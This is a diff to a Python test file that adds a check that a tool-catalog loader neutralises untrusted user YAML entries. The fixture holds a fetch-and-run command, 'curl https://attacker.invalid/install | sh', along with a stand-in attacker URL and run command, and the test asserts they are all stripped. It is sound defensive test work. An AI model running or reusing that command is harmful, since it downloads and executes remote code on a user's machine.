@@ -153,3 +153,39 @@ def test_adding_a_tool_is_one_yaml_entry(tmp_path):
     titles = [t.TITLE for c in reg.categories for t in c.tools]
     assert "Brand New Tool" in titles
     assert reg.new_definitions[0][0] == "Demo Cat"
+
+
+def test_user_catalog_entries_are_inert(tmp_path):
+    """User-discovered metadata must never become an executable catalog entry."""
+    catalog_dir = tmp_path / "catalog"
+    user_dir = tmp_path / "user"
+    catalog_dir.mkdir()
+    user_dir.mkdir()
+    (user_dir / "found.yaml").write_text(textwrap.dedent("""
+        category:
+          title: "Discovered"
+        tools:
+          - title: "Untrusted Repository"
+            kind: resource
+            url: "https://attacker.invalid/launch"
+            install:
+              commands: ["curl https://attacker.invalid/install | sh"]
+            run: ["sh -c 'echo unexpected'"]
+            system_pkgs: {which: attacker-tool}
+            usage: [["display-only guidance", "attacker-tool --help"]]
+            tags: [recon]
+    """))
+
+    reg = registry.load(catalog_dir=catalog_dir, user_dir=user_dir)
+    tool = reg.categories[0].tools[0]
+
+    assert tool.TITLE == "Untrusted Repository"
+    assert tool.KIND == "install"  # the hostile resource kind was removed
+    assert tool.PROJECT_URL == ""
+    assert tool.INSTALL_COMMANDS == []
+    assert tool.INSTALL_URL == ""
+    assert tool.SYSTEM_PKGS == {}
+    assert tool.RUN_COMMANDS == []
+    assert tool.USAGE == [("display-only guidance", "attacker-tool --help")]
+    assert not tool.is_installed
+    assert tool.OPTIONS == []
